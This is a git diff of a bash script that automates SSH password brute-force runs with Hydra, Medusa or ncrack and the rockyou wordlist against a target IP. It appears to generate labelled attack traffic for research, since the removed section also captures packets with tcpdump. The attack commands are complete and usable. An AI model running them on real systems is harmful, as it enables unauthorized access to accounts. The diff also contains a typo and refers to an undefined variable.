@@ -1,10 +1,7 @@
-############################
-FOR THE FAILED ATTEMPTS:
-###########################
 #!/bin/bash
 # 
 # SAMPLE:
-# ./AutomatedTrafficCapture.sh 10.137.0.21 10.137.0.19 22 ssh 50 5 root Deb10
+# ./AutomatedTrafficCapture./sh 10.137.0.21 10.137.0.19 22 ssh 50 5 root Deb10
 # 
 # 
 
@@ -21,9 +18,9 @@ OS=$8
 echo -n "What should I use? Hydra, Medusa or ncrack (caps matter): "
 read WHICH
 
-WORKDIR=Failed_${OS}_$(date +%H%M%S)
+WORKDIR=Failed_${WHICH}_${OS}_$(date +%H%M%S)
 mkdir $WORKDIR
-cd $WORKDIR 
+cd $WORKDIR
 
 for i in $(seq 1 $ITERATIONS)
         do
@@ -34,61 +31,33 @@ for i in $(seq 1 $ITERATIONS)
                         "Hydra")
                                 echo "---------  start hydra #$i -------------"
                                 hydra -l $UNAME -P /usr/share/wordlists/rockyou.txt -s $DST_PORT $DST_IP $PROT -I & htempid=$!
+                                RAND=$(shuf -i10-${LENGTH} -n1)
+                                echo "******* Length in seconds $RAND"
                                 echo "********* hydra PID $htempid ***********"
                                 ;;
                         "Medusa")
                                 echo "---------  start medusa #$i -------------"
+                                RAND=$(shuf -i10-${LENGTH} -n1)
+                                echo "******* Length in seconds $RAND"
                                 medusa -h $DST_IP -u $UNAME -P /usr/share/wordlists/rockyou.txt -M $PROT -n $DST_PORT -f & htempid=$!
                                 echo "********* medusa PID $htempid ***********"
-                                ;;                                                                                                                                                                                                         
-                        "ncrack")                                                                                                                                                                                                          
-                                echo "---------  start ncrack #$i -------------"                                                                                                                                                           
-                                ncrack $PROT://$DST_IP:$DST_PORT --user $UNAME -P /usr/share/wordlists/rockyou.txt -f -v & htempid=$!                                                                                                      
-                                echo "********* ncrack PID $htempid ***********"                                                                                                                                                           
-                                ;;                                                                                                                                                                                                         
-                        *)                                                                                                                                                                                                                 
-                                echo "Invalid Choice. Press Ctrl+C and start again!"                                                                                                                                                       
-                esac                                                                                                                                                                                                                       
-                sleep $LENGTH                                                                                                                                                                                                              
-                hgid=$(ps xao pid,pgid,comm | grep ${htempid} | awk '{ print $2 }')                                                                                                                                                        
-                echo "****** HGID $hgid **********"                                                                                                                                                                                                   
-                sudo pkill -TERM -P ${hgid}                                                                                                                                                                                                
-                sleep 5                                                                                                                                                                                                                    
-                sudo pkill -TERM -P ${ttempid}                                                                                                                                                                                             
-        done                                                                                         
-
-
-############################
-FOR THE SUCCESSFUL ATTEMPTS:
-###########################
-
-
-#!/bin/bash
-# 
-# SAMPLE:
-# ./AutomatedTrafficCapture.sh 10.137.0.21 10.137.0.19 22 ssh 50 5 root Deb10
-# 
-# 
-
-
-SRC_IP=$1
-DST_IP=$2
-DST_PORT=$3
-HYDRA_PROT=$4
-ITERATIONS=$5
-UNAME=$6
-OS=$7
-
-for i in $(seq 1 $ITERATIONS)
-        do
-                echo "---------- start tcpdump #$i ------------"
-                sudo tcpdump -i eth0 host $SRC_IP and host $DST_IP -w Hydra_${HYDRA_PROT}_${OS}_SUCCESS_${i}_$(date +"%T" | sed -e "s/:/-/g").pcap & tempid=$! 
-                echo "======= this is the tempid $tempid ======="
-                echo "---------  start hydra #$i -------------"
-                hydra -f -l $UNAME -P /usr/share/wordlists/rockyou.txt -u  -s $DST_PORT $DST_IP $HYDRA_PROT -I 
-#               sleep $LENGTH
-#               sudo pkill hydra
+                                ;;
+                        "ncrack")
+                                echo "---------  start ncrack #$i -------------"
+                                RAND=$(shuf -i10-${LENGTH} -n1)
+                                echo "******* Length in seconds $RAND"
+                                ncrack $PROT://$DST_IP:$DST_PORT --user $UNAME -P /usr/share/wordlists/rockyou.txt -f -v & htempid=$!
+                                echo "********* ncrack PID $htempid ***********"
+                                ;;
+                        *)
+                                echo "Invalid Choice. Press Ctrl+C and start again!"
+                esac
+                sleep $RAND
+                hgid=$(ps xao pid,pgid,comm | grep ${htempid} | awk '{ print $2 }')
+                echo "****** HGID $hgid"
+                sudo pkill -TERM -P ${hgid}
                 sleep 5
-                sudo pkill -TERM -P ${tempid}
+                sudo pkill -TERM -P ${ttempid}
+                rm hydra.restore
         done
 
